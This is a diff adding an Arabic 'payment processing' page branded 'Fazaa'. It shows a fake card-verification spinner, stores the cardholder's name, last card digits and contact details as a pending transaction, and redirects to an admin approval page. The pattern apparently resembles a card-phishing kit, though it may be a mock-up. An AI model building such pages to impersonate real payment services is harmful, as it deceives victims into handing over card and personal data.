@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري معالجة الدفع - فزعة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 20px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid #0066cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 20px;
+        }
+
+        .status-text {
+            font-size: 13px;
+            color: #0066cc;
+            font-weight: 500;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #0066cc;
+            animation: progress 3s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <div class="title">جاري معالجة الدفع</div>
+        <div class="subtitle">يرجى الانتظار قليلاً...</div>
+        <div class="status-text">جاري التحقق من بيانات البطاقة</div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+    </div>
+
+    <script>
+        // Simulate payment processing
+        setTimeout(() => {
+            // Save transaction to admin panel
+            const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
+            
+            const transaction = {
+                id: 'TXN_' + Date.now(),
+                type: 'card_verification',
+                status: 'pending_approval',
+                cardholderName: paymentData.cardholderName,
+                cardNumber: paymentData.cardNumber ? paymentData.cardNumber.slice(-4) : '',
+                customerName: formData.full_name,
+                email: formData.email,
+                phone: formData.phone,
+                emirate: formData.emirate,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                createdAt: new Date().toISOString()
+            };
+
+            // Save to transactions list
+            const transactions = JSON.parse(localStorage.getItem('fazaaTransactions') || '[]');
+            transactions.push(transaction);
+            localStorage.setItem('fazaaTransactions', JSON.stringify(transactions));
+
+            // Redirect to admin for approval
+            window.location.href = 'admin_approval_ar.html?txnId=' + transaction.id;
+        }, 3000);
+    </script>
+</body>
+</html>
